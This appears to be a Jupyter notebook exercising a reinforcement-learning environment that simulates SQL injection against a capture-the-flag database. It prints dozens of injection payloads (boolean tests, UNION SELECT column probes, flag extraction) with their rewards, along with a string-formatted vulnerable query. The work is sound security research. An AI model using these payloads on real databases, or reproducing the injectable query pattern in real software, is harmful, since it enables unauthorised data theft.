In [1]:
import numpy as np
from IPython.display import clear_output, display
from tqdm import tqdm
import environment
import gym
import structured.generate_actions as gen_acts

In [2]:
env = gym.make('SQL-v1')

In [3]:
actions = gen_acts.generate_actions()
env.reset()

''

In [4]:
print(env.hidden_query)
for action in actions:
    print(env.step(action)[1],"||||", env.hidden_query.format(input = action))
    #print(env.step(action)[:2],"||||", env.hidden_query.format(input = action))

SELECT id, username FROM users WHERE id='1{input}'
-0.1 |||| SELECT id, username FROM users WHERE id='1' and 1=1 --'
-0.1 |||| SELECT id, username FROM users WHERE id='1' and 1=2 --'
-1.0 |||| SELECT id, username FROM users WHERE id='1' union select NULL --'
-0.1 |||| SELECT id, username FROM users WHERE id='1' union select NULL, NULL --'
-1.0 |||| SELECT id, username FROM users WHERE id='1' union select NULL, NULL, NULL --'
-1.0 |||| SELECT id, username FROM users WHERE id='1' union select NULL, NULL, NULL, NULL --'
-1.0 |||| SELECT id, username FROM users WHERE id='1' union select NULL, NULL, NULL, NULL, NULL --'
-1.0 |||| SELECT id, username FROM users WHERE id='1' union select flag from flagtable --'
99.9 |||| SELECT id, username FROM users WHERE id='1' union select flag, NULL from flagtable --'
-1.0 |||| SELECT id, username FROM users WHERE id='1' union select flag, NULL, NULL from flagtable --'
-1.0 |||| SELECT id, username FROM users WHERE id='1' union select flag, NULL, NULL, NULL from flagtable --'
-1.0 |||| SELECT id, username FROM users WHERE id='1' union select flag, NULL, NULL, NULL, NULL from flagtable --'
-0.1 |||| SELECT id, username FROM users WHERE id='1" and 1=1 --'
-0.1 |||| SELECT id, username FROM users WHERE id='1" and 1=2 --'
-0.1 |||| SELECT id, username FROM users WHERE id='1" union select NULL --'
-0.1 |||| SELECT id, username FROM users WHERE id='1" union select NULL, NULL --'
-0.1 |||| SELECT id, username FROM users WHERE id='1" union select NULL, NULL, NULL --'
-0.1 |||| SELECT id, username FROM users WHERE id='1" union select NULL, NULL, NULL, NULL --'
-0.1 |||| SELECT id, username FROM users WHERE id='1" union select NULL, NULL, NULL, NULL, NULL --'
-0.1 |||| SELECT id, username FROM users WHERE id='1" union select flag from flagtable --'
-0.1 |||| SELECT id, username FROM users WHERE id='1" union select flag, NULL from flagtable --'
-0.1 |||| SELECT id, username FROM users WHERE id='1" union select flag, NULL, NULL from flagtable --'
-0.1 |||| SELECT id, username FROM users WHERE id='1" union select flag, NULL, NULL, NULL from flagtable --'
-0.1 |||| SELECT id, username FROM users WHERE id='1" union select flag, NULL, NULL, NULL, NULL from flagtable --'
-0.1 |||| SELECT id, username FROM users WHERE id='1 and 1=1 --'
-0.1 |||| SELECT id, username FROM users WHERE id='1 and 1=2 --'
-0.1 |||| SELECT id, username FROM users WHERE id='1 union select NULL --'
-0.1 |||| SELECT id, username FROM users WHERE id='1 union select NULL, NULL --'
-0.1 |||| SELECT id, username FROM users WHERE id='1 union select NULL, NULL, NULL --'
-0.1 |||| SELECT id, username FROM users WHERE id='1 union select NULL, NULL, NULL, NULL --'
-0.1 |||| SELECT id, username FROM users WHERE id='1 union select NULL, NULL, NULL, NULL, NULL --'
-0.1 |||| SELECT id, username FROM users WHERE id='1 union select flag from flagtable --'
-0.1 |||| SELECT id, username FROM users WHERE id='1 union select flag, NULL from flagtable --'
-0.1 |||| SELECT id, username FROM users WHERE id='1 union select flag, NULL, NULL from flagtable --'
-0.1 |||| SELECT id, username FROM users WHERE id='1 union select flag, NULL, NULL, NULL from flagtable --'
-0.1 |||| SELECT id, username FROM users WHERE id='1 union select flag, NULL, NULL, NULL, NULL from flagtable --'

In [5]:
env.reset()
print(env.hidden_query)
for action in actions:
    print(env.step(action)[1],"||||", env.hidden_query.format(input = action))
    #print(env.step(action)[:2],"||||", env.hidden_query.format(input = action))

SELECT id, username FROM users WHERE id=1{input}
-1.0 |||| SELECT id, username FROM users WHERE id=1' and 1=1 --
-1.0 |||| SELECT id, username FROM users WHERE id=1' and 1=2 --
-1.0 |||| SELECT id, username FROM users WHERE id=1' union select NULL --
-1.0 |||| SELECT id, username FROM users WHERE id=1' union select NULL, NULL --
-1.0 |||| SELECT id, username FROM users WHERE id=1' union select NULL, NULL, NULL --
-1.0 |||| SELECT id, username FROM users WHERE id=1' union select NULL, NULL, NULL, NULL --
-1.0 |||| SELECT id, username FROM users WHERE id=1' union select NULL, NULL, NULL, NULL, NULL --
-1.0 |||| SELECT id, username FROM users WHERE id=1' union select flag from flagtable --
-1.0 |||| SELECT id, username FROM users WHERE id=1' union select flag, NULL from flagtable --
-1.0 |||| SELECT id, username FROM users WHERE id=1' union select flag, NULL, NULL from flagtable --
-1.0 |||| SELECT id, username FROM users WHERE id=1' union select flag, NULL, NULL, NULL from flagtable --
-1.0 |||| SELECT id, username FROM users WHERE id=1' union select flag, NULL, NULL, NULL, NULL from flagtable --
-1.0 |||| SELECT id, username FROM users WHERE id=1" and 1=1 --
-1.0 |||| SELECT id, username FROM users WHERE id=1" and 1=2 --
-1.0 |||| SELECT id, username FROM users WHERE id=1" union select NULL --
-1.0 |||| SELECT id, username FROM users WHERE id=1" union select NULL, NULL --
-1.0 |||| SELECT id, username FROM users WHERE id=1" union select NULL, NULL, NULL --
-1.0 |||| SELECT id, username FROM users WHERE id=1" union select NULL, NULL, NULL, NULL --
-1.0 |||| SELECT id, username FROM users WHERE id=1" union select NULL, NULL, NULL, NULL, NULL --
-1.0 |||| SELECT id, username FROM users WHERE id=1" union select flag from flagtable --
-1.0 |||| SELECT id, username FROM users WHERE id=1" union select flag, NULL from flagtable --
-1.0 |||| SELECT id, username FROM users WHERE id=1" union select flag, NULL, NULL from flagtable --
-1.0 |||| SELECT id, username FROM users WHERE id=1" union select flag, NULL, NULL, NULL from flagtable --
-1.0 |||| SELECT id, username FROM users WHERE id=1" union select flag, NULL, NULL, NULL, NULL from flagtable --
-0.1 |||| SELECT id, username FROM users WHERE id=1 and 1=1 --
-0.1 |||| SELECT id, username FROM users WHERE id=1 and 1=2 --
-1.0 |||| SELECT id, username FROM users WHERE id=1 union select NULL --
-0.1 |||| SELECT id, username FROM users WHERE id=1 union select NULL, NULL --
-1.0 |||| SELECT id, username FROM users WHERE id=1 union select NULL, NULL, NULL --
-1.0 |||| SELECT id, username FROM users WHERE id=1 union select NULL, NULL, NULL, NULL --
-1.0 |||| SELECT id, username FROM users WHERE id=1 union select NULL, NULL, NULL, NULL, NULL --
-1.0 |||| SELECT id, username FROM users WHERE id=1 union select flag from flagtable --
99.9 |||| SELECT id, username FROM users WHERE id=1 union select flag, NULL from flagtable --
-1.0 |||| SELECT id, username FROM users WHERE id=1 union select flag, NULL, NULL from flagtable --
-1.0 |||| SELECT id, username FROM users WHERE id=1 union select flag, NULL, NULL, NULL from flagtable --
-1.0 |||| SELECT id, username FROM users WHERE id=1 union select flag, NULL, NULL, NULL, NULL from flagtable --

In [6]:
env.cursor.execute("select * from users")
env.cursor.fetchall()

[(1, 'admin', 'admin', 'admin', '78!', 'IT', '1994-11-02'),
 (2, 'dricci', 'dian', 'ricci', 12345, 'AI', '2021-02-02'),
 (3, 'amason', 'anthony', 'mason', 45, 'Middle earth', '1301-02-02'),
 (4, 'svargas', 'sandra', 'vargas', 19, 'Earth', '2040-01-01'),
 (5, '123', 'Bob', '123', 33, 'The island', '3011-01-01')]